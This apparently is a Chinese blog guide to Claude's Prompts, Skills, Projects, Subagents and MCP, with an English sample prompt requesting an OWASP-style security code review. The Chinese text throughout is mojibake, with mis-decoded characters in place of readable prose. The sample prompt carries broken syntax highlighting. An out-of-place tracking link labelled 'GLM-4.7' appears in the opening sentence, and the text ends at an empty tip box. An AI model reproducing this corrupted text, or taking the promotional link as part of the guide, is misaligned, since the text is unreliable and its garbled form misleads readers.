<p>ä¸ç®¡ä½ æ˜¯åœ¨ <strong>Claude Code</strong> é‡Œæ­å»ºå¤æ‚å·¥ä½œæµï¼Œç”¨ <strong>API</strong> åšä¼ä¸šçº§è§£å†³æ–¹æ¡ˆï¼Œè¿˜æ˜¯åœ¨ <strong>Claude.ai</strong> ä¸Šæå‡æ—¥å¸¸æ•ˆç‡â€”â€”åªè¦ä½ èƒ½åˆ¤æ–­â€œè¯¥ç”¨å“ªä¸ªç»„ä»¶ã€ä»€ä¹ˆæ—¶å€™ç”¨â€ï¼Œä½ å’Œ Claude çš„åä½œæ–¹å¼å°±ä¼šä»ã€Œä¸ <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhipuaishengchan.datasink.sensorsdata.cn%2Ft%2FKH" target="_blank" title="https://zhipuaishengchan.datasink.sensorsdata.cn/t/KH" ref="nofollow noopener noreferrer">GLM-4.7</a> çš„ä¸´æ—¶å¯¹è¯ã€å‡çº§ä¸ºã€Œç¨³å®šçš„å·¥ä½œç³»ç»Ÿã€ã€‚</p>
<p>è¿™ä»½æŒ‡å—ä¼šå›´ç»•å‡ ä¸ªå…³é”®â€œç»„ä»¶â€å±•å¼€ï¼šå®ƒä»¬åˆ†åˆ«è§£å†³ä»€ä¹ˆé—®é¢˜ã€é€‚ç”¨äºå“ªäº›åœºæ™¯ï¼Œä»¥åŠå¦‚ä½•ç»„åˆä½¿ç”¨ï¼Œæ­å‡ºæ›´å¼ºå¤§çš„æ™ºèƒ½ä½“å·¥ä½œæµã€‚</p>
<hr/>
<h2 data-id="heading-0"><strong>å…ˆæ˜ç¡®ä¸€ä¸‹å®šä½ï¼šå®ƒä»¬åˆ†åˆ«è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ</strong></h2>
<p>ä¸ºäº†é¿å…æ¦‚å¿µæ··åœ¨ä¸€èµ·ï¼Œå¯ä»¥ç”¨ä¸€å¥è¯æŠ“ä½æ¯ä¸ªç»„ä»¶çš„å®šä½ï¼š</p>
<ul>
<li><strong>Prompts</strong>ï¼šä½ åœ¨å½“ä¸‹å¯¹è¯é‡Œç»™ Claude çš„æŒ‡ä»¤ï¼ˆå³æ—¶ã€çµæ´»ï¼Œä½†ä¸æŒä¹…ï¼‰</li>
<li><strong>Skills</strong>ï¼šå¯å¤ç”¨çš„â€œæ“ä½œæ‰‹å†Œ + èµ„æºåŒ…â€ï¼ˆè®© Claude ç¨³å®šåœ°æŒ‰åŒä¸€å¥—æ–¹æ³•åšäº‹ï¼‰</li>
<li><strong>Projects</strong>ï¼šé¢å‘æŸä¸ªå·¥ä½œä¸»é¢˜çš„é•¿æœŸå·¥ä½œç©ºé—´ï¼ˆæŒç»­ç§¯ç´¯çŸ¥è¯†ä¸å¯¹è¯ä¸Šä¸‹æ–‡ï¼‰</li>
<li><strong>Subagents</strong>ï¼šåˆ†å·¥æ˜ç¡®çš„â€œå­è§’è‰²/å­åŠ©æ‰‹â€ï¼ˆç‹¬ç«‹ä¸Šä¸‹æ–‡ + æƒé™éš”ç¦»ï¼Œç”¨äºä¸“é—¨ä»»åŠ¡ï¼‰</li>
<li><strong>MCP</strong>ï¼šè¿æ¥å±‚åè®®ï¼ˆè®© Claude æ¥å…¥å¤–éƒ¨å·¥å…·ä¸æ•°æ®æºï¼Œè§£å†³â€œæ•°æ®åœ¨å“ªå„¿â€ï¼‰</li>
</ul>
<p>æœ‰äº†è¿™ä¸ªæ€»æ¡†æ¶ï¼Œä¸‹é¢å†çœ‹æ¯ä¸€é¡¹ï¼Œå°±æ›´å®¹æ˜“ç†è§£å®ƒä»¬ä¹‹é—´çš„å…³ç³»ä¸è¾¹ç•Œã€‚</p>
<hr/>
<h2 data-id="heading-1"><strong>Promptsï¼šå¯¹è¯ä¸­çš„æŒ‡ä»¤</strong></h2>
<p><strong>Promptsï¼ˆæç¤ºè¯ï¼‰æ˜¯ä½ åœ¨ Claude è¿›è¡Œå¯¹è¯æ—¶ï¼Œç”¨è‡ªç„¶è¯­è¨€ç»™å‡ºçš„æŒ‡ä»¤ã€‚å®ƒçš„ç‰¹ç‚¹æ˜¯å³æ—¶ã€å¯¹è¯å¼ã€å¯éšæ—¶è°ƒæ•´</strong>ï¼šä½ åœ¨å½“ä¸‹è¡¥å……èƒŒæ™¯ã€æå‡ºè¦æ±‚ï¼ŒClaude ä¾æ®å½“å‰è¾“å…¥å®Œæˆä¸€æ¬¡å“åº”ã€‚</p>
<h3 data-id="heading-2"><strong>é€‚ç”¨åœºæ™¯</strong></h3>
<ul>
<li><strong>ä¸€æ¬¡æ€§éœ€æ±‚</strong>ï¼šä¾‹å¦‚ã€Œæ€»ç»“è¿™ç¯‡æ–‡ç« ã€</li>
<li><strong>å¯¹è¯ä¸­çš„è¿­ä»£ä¼˜åŒ–</strong>ï¼šä¾‹å¦‚ã€ŒæŠŠè¯­æ°”æ”¹å¾—æ›´ä¸“ä¸šã€</li>
<li><strong>å³æ—¶ä¸Šä¸‹æ–‡è¾“å…¥</strong>ï¼šä¾‹å¦‚ã€Œåˆ†æè¿™ä»½æ•°æ®å¹¶è¯†åˆ«è¶‹åŠ¿ã€</li>
<li><strong>ä¸´æ—¶æ ¼å¼/å‘ˆç°è¦æ±‚</strong>ï¼šä¾‹å¦‚ã€ŒæŒ‰é¡¹ç›®ç¬¦å·åˆ—è¡¨è¾“å‡ºã€</li>
</ul>
<h3 data-id="heading-3"><strong>ç¤ºä¾‹ Prompt</strong></h3>
<pre><code class="hljs language-sql" lang="sql">Please conduct a comprehensive security review <span class="hljs-keyword">of</span> this code. I<span class="hljs-string">'m looking for:
1. Common vulnerabilities including:
Injection flaws (SQL, command, XSS, etc.)
Authentication and authorization issues
Sensitive data exposure
Security misconfigurations
Broken access control
Cryptographic failures
Input validation problems
Error handling and logging issues
2. For each issue you find, please provide:
Severity level (Critical/High/Medium/Low)
Location in the code (line numbers or function names)
Explanation of why it'</span>s a security risk <span class="hljs-keyword">and</span> how it could be exploited
<span class="hljs-keyword">Specific</span> fix recommendation <span class="hljs-keyword">with</span> code examples <span class="hljs-keyword">where</span> possible
Best practice guidance <span class="hljs-keyword">to</span> prevent <span class="hljs-keyword">similar</span> issues
<span class="hljs-number">3.</span> Code context: [<span class="hljs-keyword">Describe</span> what the code does, the <span class="hljs-keyword">language</span><span class="hljs-operator">/</span>framework, <span class="hljs-keyword">and</span> the environment it runs <span class="hljs-keyword">in</span> <span class="hljs-operator">-</span> e.g., "This is a Node.js REST API that handles user authentication and processes payment data"]
<span class="hljs-number">4.</span> Additional considerations:
<span class="hljs-keyword">Are</span> there <span class="hljs-keyword">any</span> OWASP Top <span class="hljs-number">10</span> vulnerabilities present?
Does the code follow security best practices <span class="hljs-keyword">for</span> [<span class="hljs-keyword">specific</span> framework<span class="hljs-operator">/</span><span class="hljs-keyword">language</span>]?
<span class="hljs-keyword">Are</span> there <span class="hljs-keyword">any</span> dependencies <span class="hljs-keyword">with</span> known vulnerabilities?
Please prioritize findings <span class="hljs-keyword">by</span> severity <span class="hljs-keyword">and</span> potential impact. 
</code></pre>
<blockquote>
<p><strong>å°æç¤ºï¼š</strong></p>
<p>Prompts æ˜¯äº¤äº’çš„<strong>ä¸»è¦æ–¹å¼</strong>ï¼Œä½†å®ƒä»¬<strong>ä¸ä¼šè·¨å¯¹è¯è‡ªåŠ¨ä¿ç•™</strong>ã€‚å¦‚æœæŸç±»å·¥ä½œæµç¨‹éœ€è¦åå¤ä½¿ç”¨ï¼Œæˆ–æ¶‰åŠè¾ƒå¼ºçš„ä¸“ä¸š / ç»„ç»‡çŸ¥è¯†ï¼Œå»ºè®®æŠŠè¿™äº›å†…å®¹æ²‰æ·€ä¸º <strong>Skills</strong> æˆ– <strong>Projects</strong>ï¼Œä»¥è·å¾—æ›´ç¨³å®šä¸€è‡´çš„æ‰§è¡Œæ•ˆæœã€‚</p>
<p>æ¯”å¦‚æŠŠã€ŒæŒ‰ OWASP æ ‡å‡†åšä»£ç å®‰å…¨å®¡æŸ¥ã€æˆ–ã€ŒæŒ‰â€˜æ‰§è¡Œæ‘˜è¦-å…³é”®å‘ç°-å»ºè®®â€™çš„ç»“æ„è¾“å‡ºåˆ†æã€è¿™ç±»é«˜é¢‘è¦æ±‚æ•´ç†ä¸º Skillï¼Œè¿™æ ·ä½ æ— éœ€æ¯æ¬¡é‡å¤è¯´æ˜æµç¨‹ï¼ŒåŒæ—¶ä¹Ÿèƒ½ä¿è¯è¾“å‡ºçš„ä¸€è‡´æ€§ä¸å¯å¤ç”¨æ€§ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-4"><strong>Skillsï¼šæŠŠé«˜é¢‘æ–¹æ³•è®ºå˜æˆå¯å¤ç”¨èƒ½åŠ›</strong></h2>
<p><strong>Skills</strong> å¯ä»¥ç†è§£ä¸ºâ€œæ–‡ä»¶å¤¹å¼â€çš„èƒ½åŠ›åŒ…ï¼šé‡Œé¢å¯ä»¥æ”¾<strong>æŒ‡ä»¤è¯´æ˜ã€è„šæœ¬ã€èµ„æºæ–‡ä»¶</strong>ã€‚Claude åœ¨å¤„ç†ä»»åŠ¡æ—¶ä¼š<strong>æŒ‰éœ€å‘ç°å¹¶åŠ¨æ€åŠ è½½</strong>ï¼Œä»è€Œåœ¨ç‰¹å®šé¢†åŸŸæ›´ç¨³å®šã€æ›´ä¸“ä¸šã€‚</p>
<p>ä½ å¯ä»¥æŠŠ Skills ç†è§£æˆç»™ Claude é…ç½®çš„ä¸€å¥—â€œä¸“é¡¹å·¥ä½œæ‰‹å†Œâ€ï¼šä»å¤„ç† Excel è¡¨æ ¼ï¼Œåˆ°éµå¾ªå…¬å¸çš„å“ç‰Œè§„èŒƒï¼Œéƒ½å¯ä»¥é€šè¿‡ Skills å›ºåŒ–ä¸‹æ¥ã€‚</p>
<h3 data-id="heading-5"><strong>å¦‚ä½•åŠ è½½ Skillsï¼Ÿ</strong></h3>
<p>å½“ Claude å¤„ç†ä»»åŠ¡æ—¶ï¼Œå®ƒä¼šå…ˆå»æ‰«æå½“å‰å¯ç”¨çš„ Skillsï¼Œæ‰¾å‡ºå¯èƒ½ç›¸å…³çš„é‚£å‡ ä¸ªã€‚Skills é‡‡ç”¨<strong>æ¸è¿›å¼åŠ è½½ï¼ˆprogressive disclosureï¼‰</strong> æœºåˆ¶ï¼š</p>
<ul>
<li><strong>å…ˆåŠ è½½å…ƒä¿¡æ¯ï¼ˆmetadataï¼‰</strong> ï¼šå¤§æ¦‚ ~100 tokensï¼Œåªç»™ Claude è¶³å¤Ÿçš„ä¿¡æ¯ï¼Œç”¨æ¥åˆ¤æ–­â€œè¿™ä¸ª Skill æœ‰æ²¡æœ‰ç”¨â€</li>
<li><strong>éœ€è¦æ—¶å†åŠ è½½å®Œæ•´è¯´æ˜</strong>ï¼šä¸è¶…è¿‡ 5k tokens</li>
<li><strong>è„šæœ¬/æ–‡ä»¶ç­‰èµ„æº</strong>ï¼šåªæœ‰åœ¨çœŸçš„ç”¨åˆ°æ—¶æ‰ä¼šåŠ è½½</li>
</ul>
<p>ç®€å•è¯´å°±æ˜¯ï¼š<strong>å…ˆå¿«é€Ÿå®šä½ï¼Œå†æŒ‰éœ€æ·±å…¥ï¼Œæœ€åæ‰åŠ¨ç”¨èµ„æº</strong> â€”â€” æ—¢çœä¸Šä¸‹æ–‡ï¼Œä¹Ÿæ›´ç¨³ã€‚</p>
<h3 data-id="heading-6"><strong>é€‚ç”¨åœºæ™¯</strong></h3>
<p>å½“ä½ å¸Œæœ› Claude <strong>ç¨³å®šã€é‡å¤ã€é«˜æ•ˆ</strong>åœ°å®ŒæˆæŸç±»â€œä¸“ä¸šä»»åŠ¡â€æ—¶ï¼Œä¼˜å…ˆé€‰æ‹© Skillsã€‚å…¸å‹åœºæ™¯åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>ç»„ç»‡çº§å·¥ä½œæµï¼ˆæ ‡å‡†åŒ–æµç¨‹ï¼‰</strong> ï¼šç”¨äºå›ºåŒ–ä¼ä¸šå†…éƒ¨çš„ç»Ÿä¸€è§„èŒƒä¸æµç¨‹ï¼Œä¾‹å¦‚å“ç‰Œä½¿ç”¨è§„èŒƒã€åˆè§„/å®¡æ‰¹æµç¨‹ã€å¸¸ç”¨æ–‡æ¡£ä¸æ¨¡æ¿ä½“ç³»ã€‚</li>
<li><strong>é¢†åŸŸå‹èƒ½åŠ›ï¼ˆä¸“ä¸šä»»åŠ¡èƒ½åŠ›ï¼‰</strong> ï¼šç”¨äºæ²‰æ·€ç‰¹å®šé¢†åŸŸçš„æ“ä½œæ–¹æ³•ä¸æœ€ä½³å®è·µï¼Œä¾‹å¦‚ Excel å…¬å¼ä¸å»ºæ¨¡ã€PDF è§£æä¸å¤„ç†ã€æ•°æ®æ¸…æ´—ä¸åˆ†æã€‚</li>
<li><strong>ä¸ªäººåå¥½ï¼ˆä¸ªæ€§åŒ–å·¥ä½œæ–¹å¼ï¼‰</strong> ï¼šç”¨äºå›ºåŒ–ä¸ªäººåœ¨å·¥ä½œä¸­çš„åå¥½ä¸ä¹ æƒ¯ï¼Œä¾‹å¦‚ç¬”è®°ç»“æ„ä¸è®°å½•è§„åˆ™ã€ä»£ç é£æ ¼ä¸å·¥ç¨‹çº¦å®šã€è°ƒç ”æ–¹æ³•ä¸ä¿¡æ¯æ•´ç†æµç¨‹ã€‚</li>
</ul>
<p><strong>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</strong></p>
<p>ä½ å¯ä»¥åšä¸€ä¸ªâ€œå“ç‰Œè§„èŒƒâ€çš„ Skillï¼ŒæŠŠä½ ä»¬å…¬å¸çš„<strong>è‰²æ¿ã€å­—ä½“è§„èŒƒã€ç‰ˆå¼è§„èŒƒ</strong>éƒ½æ”¾è¿›å»ã€‚è¿™æ · Claude åœ¨ç”Ÿæˆ <strong>PPT æˆ–æ–‡æ¡£</strong> æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨å¥—ç”¨è¿™äº›æ ‡å‡†ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ ä¸ç”¨æ¯æ¬¡éƒ½ä»å¤´è§£é‡Šä¸€éã€‚</p>
<hr/>
<h2 data-id="heading-7"><strong>Projectsï¼šå»ºç«‹é•¿æœŸå·¥ä½œç©ºé—´</strong></h2>
<p><strong>Projectsï¼ˆé¡¹ç›®ï¼‰æ˜¯ä¸€ç§è‡ªåŒ…å«çš„å·¥ä½œç©ºé—´ï¼šæ¯ä¸ªé¡¹ç›®æœ‰ç‹¬ç«‹çš„èŠå¤©è®°å½•ä¸çŸ¥è¯†åº“ï¼Œå¹¶æä¾› 200K context windowã€‚ä½ å¯ä»¥åœ¨å…¶ä¸­ä¸Šä¼ èµ„æ–™ã€è¡¥å……èƒŒæ™¯ï¼Œå¹¶è®¾ç½®é¡¹ç›®çº§è‡ªå®šä¹‰æŒ‡ä»¤</strong>ï¼Œå¯¹è¯¥é¡¹ç›®å†…çš„æ‰€æœ‰å¯¹è¯ç”Ÿæ•ˆã€‚</p>
<h3 data-id="heading-8"><strong>Projects æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Ÿ</strong></h3>
<p>ä½ ä¸Šä¼ åˆ°<strong>é¡¹ç›®çŸ¥è¯†åº“</strong>çš„å†…å®¹ï¼Œ<strong>ä¼šåœ¨è¯¥é¡¹ç›®å†…çš„æ‰€æœ‰å¯¹è¯ä¸­æŒç»­å¯ç”¨ã€‚</strong> Claude ä¼šè‡ªåŠ¨åˆ©ç”¨è¿™äº›ä¸Šä¸‹æ–‡ï¼Œä¸ºä½ ç”Ÿæˆæ›´å……åˆ†ã€æ›´ç›¸å…³çš„å›ç­”ã€‚</p>
<p><strong>å½“é¡¹ç›®çŸ¥è¯†æ¥è¿‘ä¸Šä¸‹æ–‡é™åˆ¶æ—¶ï¼ŒClaude ä¼šæ— ç¼å¯ç”¨ RAGï¼ˆRetrieval Augmented Generationï¼Œæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰æ¨¡å¼ï¼Œå°†å¯ç”¨å®¹é‡æ‰©å±•è‡³æœ€é«˜ 10 å€</strong>ã€‚</p>
<h3 data-id="heading-9"><strong>é€‚ç”¨åœºæ™¯</strong></h3>
<p>å½“ä½ éœ€è¦ä»¥ä¸‹èƒ½åŠ›æ—¶ï¼Œä¼˜å…ˆé€‰æ‹© Projectsï¼š</p>
<ul>
<li><strong>æŒä¹…ä¸Šä¸‹æ–‡</strong>ï¼šéœ€è¦è®©åŒä¸€æ‰¹èƒŒæ™¯çŸ¥è¯†æŒç»­å½±å“æ¯æ¬¡å¯¹è¯</li>
<li><strong>å·¥ä½œç©ºé—´ç»„ç»‡</strong>ï¼šä¸ºä¸åŒé¡¹ç›®/è®¡åˆ’éš”ç¦»ä¸åŒçš„ä¸Šä¸‹æ–‡ï¼Œäº’ä¸å¹²æ‰°</li>
<li><strong>å›¢é˜Ÿåä½œ</strong>ï¼šå…±äº«çŸ¥è¯†åº“ä¸å¯¹è¯å†å²ï¼ˆé€‚ç”¨äº <strong>Team / Enterprise</strong> å¥—é¤ï¼‰</li>
<li><strong>è‡ªå®šä¹‰æŒ‡ä»¤</strong>ï¼šä¸ºé¡¹ç›®è®¾ç½®ä¸“å±çš„è¯­æ°”ã€è§†è§’æˆ–å·¥ä½œæ–¹å¼</li>
</ul>
<p><strong>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</strong></p>
<p>åœ¨åˆ›å»ºä¸€ä¸ªã€Œ<strong>Q4 Product Launch</strong>ã€é¡¹ç›®æ—¶ï¼Œä½ å¯ä»¥æŠŠæŠŠå¸‚åœºè°ƒç ”ã€ç«å“åˆ†æã€äº§å“è§„æ ¼ç­‰ææ–™ç»Ÿä¸€æ”¾è¿›å»ã€‚æ­¤åä½ åœ¨è¯¥é¡¹ç›®å¼€å¯çš„æ¯ä¸€æ¬¡å¯¹è¯ï¼Œéƒ½èƒ½ç›´æ¥è°ƒç”¨è¿™äº›å†…å®¹ï¼Œæ— éœ€åå¤ä¸Šä¼ æˆ–é‡å¤è§£é‡ŠèƒŒæ™¯ã€‚</p>
<blockquote>
<p><strong>å°æç¤ºï¼š</strong></p>
<p><strong>Projects</strong> çš„æ ¸å¿ƒä½œç”¨æ˜¯ï¼šä¸ºæŸä¸ªç‰¹å®šå·¥ä½œåœºæ™¯æä¾›<strong>æŒç»­çš„ä¸Šä¸‹æ–‡</strong>ï¼ˆæ¯”å¦‚å…¬å¸ä»£ç åº“ã€ç ”ç©¶è¯¾é¢˜ã€é•¿æœŸå®¢æˆ·é¡¹ç›®ï¼‰ã€‚è€Œ <strong>Skills</strong> çš„æ ¸å¿ƒä½œç”¨æ˜¯ï¼šæ•™ä¼š Claude <strong>â€œæ€ä¹ˆåšâ€</strong> æŸä»¶äº‹ã€‚</p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼ŒProject å¯ä»¥å­˜æ”¾äº§å“å‘å¸ƒç›¸å…³çš„æ‰€æœ‰èƒŒæ™¯ææ–™ï¼›Skill åˆ™å¯ä»¥æ²‰æ·€ä½ ä»¬å›¢é˜Ÿçš„å†™ä½œè§„èŒƒæˆ–ä»£ç è¯„å®¡æµç¨‹ã€‚å¦‚æœä½ å‘ç°è‡ªå·±åœ¨å¤šä¸ª Projects ä¹‹é—´åå¤å¤åˆ¶åŒä¸€å¥—æŒ‡ä»¤ï¼Œä½ å¯ä»¥æŠŠè¿™äº›é€šç”¨è§„åˆ™æŠ½å‡ºæ¥åšæˆä¸€ä¸ª Skillã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-10"><strong>Subagents ï¼šæŠŠä»»åŠ¡æ‹†åˆ†ç»™â€œç‹¬ç«‹æ‰§è¡Œå•å…ƒâ€</strong></h2>
<p><strong>Subagentsï¼ˆå­ä»£ç†ï¼‰</strong> æ˜¯ä¸€ç±»é¢å‘ç‰¹å®šä»»åŠ¡çš„ AI åŠ©æ‰‹ï¼Œå®ƒæ‹¥æœ‰ç‹¬ç«‹çš„ä¸Šä¸‹æ–‡çª—å£ã€å¯å®šåˆ¶çš„ç³»ç»Ÿæç¤ºè¯ï¼Œä»¥åŠè¢«æ˜ç¡®é™å®šçš„å·¥å…·æƒé™ã€‚å®ƒä»¬å¯åœ¨ <strong>Claude Code</strong> ä¸ <strong>Claude Agent SDK</strong> ä¸­ä½¿ç”¨ï¼Œç”¨äºç‹¬ç«‹å¤„ç†ç¦»æ•£ä»»åŠ¡å¹¶å›ä¼ ç»“æœç»™ä¸»ä»£ç†ã€‚</p>
<h3 data-id="heading-11"><strong>Subagents æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Ÿ</strong></h3>
<p>ä½ å¯ä»¥ä¸ºæ¯ä¸ª subagent å®šä¹‰ï¼š</p>
<ul>
<li>å®ƒè´Ÿè´£ä»€ä¹ˆï¼Ÿ</li>
<li>å¦‚ä½•å¤„ç†é—®é¢˜ï¼Ÿ</li>
<li>èƒ½è®¿é—®å“ªäº›å·¥å…·ï¼Ÿ</li>
</ul>
<p>Claude å¯ä»¥æ ¹æ® subagent çš„æè¿°<strong>è‡ªåŠ¨æŠŠä»»åŠ¡å§”æ´¾</strong>ç»™åˆé€‚çš„ subagentï¼›ä½ ä¹Ÿå¯ä»¥åœ¨å¯¹è¯ä¸­<strong>ç›´æ¥æŒ‡å®š</strong>è°ƒç”¨æŸä¸ª subagentã€‚</p>
<h3 data-id="heading-12"><strong>é€‚ç”¨åœºæ™¯</strong></h3>
<p>Subagents ç‰¹åˆ«é€‚åˆä»¥ä¸‹éœ€æ±‚ï¼š</p>
<ul>
<li><strong>ä»»åŠ¡ä¸“ç²¾</strong>ï¼šå¦‚ä»£ç å®¡æŸ¥ã€æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆã€å®‰å…¨å®¡è®¡</li>
<li><strong>ä¸Šä¸‹æ–‡ç®¡ç†</strong>ï¼šæŠŠä¸»å¯¹è¯ä¿æŒåœ¨ä¸»çº¿ï¼ŒæŠŠä¸“ä¸šä¸”ç»†ç¢çš„å·¥ä½œä¸‹æ”¾ç»™å­ä»£ç†å¤„ç†</li>
<li><strong>å¹¶è¡Œå¤„ç†</strong>ï¼šå¤šä¸ª subagent å¯åŒæ—¶å¤„ç†ä¸åŒç»´åº¦çš„å·¥ä½œ</li>
<li><strong>å·¥å…·éš”ç¦»ä¸é™åˆ¶</strong>ï¼šå°†ç‰¹å®š subagent é™å®šä¸ºæ›´å®‰å…¨çš„æ“ä½œèŒƒå›´ï¼ˆä¾‹å¦‚åªè¯»æƒé™ï¼‰</li>
</ul>
<p><strong>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</strong></p>
<p>åˆ›å»ºä¸€ä¸ª <strong>code-reviewer subagent</strong>ï¼Œä»…å…è®¸ä½¿ç”¨ <strong>Read / Grep / Glob</strong> ç­‰è¯»å–ä¸æ£€ç´¢å·¥å…·ï¼Œä¸å¼€æ”¾ <strong>Write / Edit</strong>ã€‚è¿™æ ·å½“ä½ ä¿®æ”¹ä»£ç åï¼ŒClaude å¯ä»¥è‡ªåŠ¨å°†è´¨é‡ä¸å®‰å…¨å®¡æŸ¥äº¤ç»™è¯¥ subagent å®Œæˆï¼ŒåŒæ—¶é¿å…å‡ºç°â€œæ„å¤–æ”¹åŠ¨ä»£ç â€çš„é£é™©ã€‚</p>
<blockquote>
<p><strong>å°æç¤ºï¼š</strong></p>
<p>å¦‚æœä½ å¸Œæœ›<strong>å¤šä¸ªä»£ç†æˆ–å¤šæ®µå¯¹è¯</strong>éƒ½å¤ç”¨åŒä¸€å¥—ä¸“ä¸šæ–¹æ³•ï¼ˆä¾‹å¦‚å®‰å…¨å®¡æŸ¥æµç¨‹ã€æ•°æ®åˆ†ææ–¹æ³•ï¼‰ï¼Œå»ºè®®å°†è¿™äº›çŸ¥è¯†æ²‰æ·€ä¸º <strong>Skill</strong>ï¼Œè€Œä¸æ˜¯å†™æ­»åœ¨æŸä¸ª subagent é‡Œã€‚</p>
<p>ä¸€å¥è¯åŒºåˆ†ï¼š</p>
<ul>
<li>ç”¨ <strong>Skills</strong>ï¼šæŠŠâ€œæ€ä¹ˆåšâ€æ•™ç»™æ‰€æœ‰ä»£ç†éƒ½èƒ½ç”¨</li>
<li>ç”¨ <strong>Subagents</strong>ï¼šéœ€è¦ç‹¬ç«‹æ‰§è¡Œã€æƒé™éš”ç¦»ã€ä¸Šä¸‹æ–‡éš”ç¦»ï¼Œå¹¶ä¸”èƒ½æŒ‰è§’è‰²åˆ†å·¥å®Œæˆä»»åŠ¡</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-13"><strong>MCPï¼šè®© Claude æ¥å…¥å¤–éƒ¨å·¥å…·ä¸æ•°æ®æº</strong></h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02623cbb4b5e42aeaf7625908f237933~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66LCx5byA5pS-5bmz5Y-w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769072620&amp;x-signature=HagOD14lUey%2FqTO%2FoJwQhg2CnUY%3D" alt="" loading="lazy"/></p>
<p><em><strong>MCP</strong></em> <em>åœ¨ AI åº”ç”¨ä¸æ—¢æœ‰å·¥å…·ã€æ•°æ®æºä¹‹é—´ï¼Œæä¾›äº†ä¸€å±‚</em><em><strong>é€šç”¨çš„è¿æ¥æ¥å£</strong></em> <em>ã€‚</em></p>
<p><em>é€šè¿‡ MCPï¼ŒAI åº”ç”¨å¯ä»¥ç”¨æ›´ç»Ÿä¸€çš„æ–¹å¼æ¥å…¥ä½ ç°æœ‰çš„å·¥å…·é“¾ä¸æ•°æ®æ¥æºã€‚</em></p>
<p><strong>Model Context Protocolï¼ˆMCPï¼‰</strong> æ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†ï¼Œç”¨äºæŠŠ AI åŠ©æ‰‹è¿æ¥åˆ°å¤–éƒ¨ç³»ç»Ÿ â€”â€” å†…å®¹åº“ã€ä¼ä¸šä¸šåŠ¡å·¥å…·ã€æ•°æ®åº“ã€å¼€å‘ç¯å¢ƒç­‰ã€‚</p>
<h3 data-id="heading-14"><strong>MCP æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Ÿ</strong></h3>
<p>MCP æä¾›äº†ä¸€å¥—æ ‡å‡†åŒ–çš„è¿æ¥æ–¹å¼ï¼Œè®© Claude èƒ½ä»¥<strong>ç»Ÿä¸€åè®®</strong>æ¥å…¥ä½ çš„å·¥å…·ä¸æ•°æ®æºã€‚ç›¸æ¯”ä¸ºæ¯ä¸ªæ•°æ®æºå•ç‹¬å¼€å‘ä¸€å¥—é›†æˆï¼Œä½ åªéœ€è¦å¯¹æ¥ <strong>åŒä¸€ä¸ªåè®®</strong> å³å¯ã€‚</p>
<ul>
<li><strong>MCP Serverï¼ˆæœåŠ¡å™¨ç«¯ï¼‰</strong> ï¼šå¯¹å¤–æš´éœ²æ•°æ®ä¸èƒ½åŠ›ï¼ˆæ¯”å¦‚è¯»å–æ–‡æ¡£ã€æŸ¥è¯¢æ•°æ®åº“ã€è°ƒç”¨æŸä¸ªå·¥å…·èƒ½åŠ›ï¼‰</li>
<li><strong>MCP Clientï¼ˆå®¢æˆ·ç«¯ï¼‰</strong> ï¼šç”± Claude ç­‰ AI åº”ç”¨æ‰®æ¼”ï¼Œè´Ÿè´£è¿æ¥è¿™äº›æœåŠ¡å™¨å¹¶å‘èµ·è°ƒç”¨</li>
</ul>
<h3 data-id="heading-15"><strong>é€‚ç”¨åœºæ™¯</strong></h3>
<p>å½“ä½ éœ€è¦ Claude åšåˆ°ä»¥ä¸‹èƒ½åŠ›æ—¶ï¼Œé€‚åˆé€‰æ‹© MCPï¼š</p>
<ul>
<li><strong>è®¿é—®å¤–éƒ¨æ•°æ®</strong>ï¼šå¦‚ Google Driveã€Slackã€GitHubã€å„ç±»æ•°æ®åº“</li>
<li><strong>è°ƒç”¨ä¸šåŠ¡ç³»ç»Ÿ</strong>ï¼šå¦‚ CRMã€é¡¹ç›®ç®¡ç†å¹³å°ç­‰</li>
<li><strong>è¿æ¥å¼€å‘ç¯å¢ƒ</strong>ï¼šæœ¬åœ°æ–‡ä»¶ã€IDEã€ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿç­‰</li>
<li><strong>å¯¹æ¥è‡ªç ”ç³»ç»Ÿ</strong>ï¼šä¼ä¸šå†…éƒ¨çš„ä¸“æœ‰å·¥å…·ä¸æ•°æ®æº</li>
</ul>
<p><strong>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</strong></p>
<p>é€šè¿‡ MCP å°† Claude è¿æ¥åˆ°å…¬å¸ Google Driveã€‚æ­¤å Claude å°±èƒ½ç›´æ¥<strong>æœç´¢æ–‡æ¡£ã€è¯»å–æ–‡ä»¶ã€å¼•ç”¨å†…éƒ¨çŸ¥è¯†</strong>ï¼Œæ— éœ€ä½ æ‰‹åŠ¨ä¸Šä¼ ï¼›è€Œä¸”è¿™ç§è¿æ¥å¯ä»¥<strong>æŒç»­ç”Ÿæ•ˆå¹¶è‡ªåŠ¨æ›´æ–°</strong>ã€‚</p>
<blockquote>
<p><strong>å°æç¤ºï¼š</strong></p>
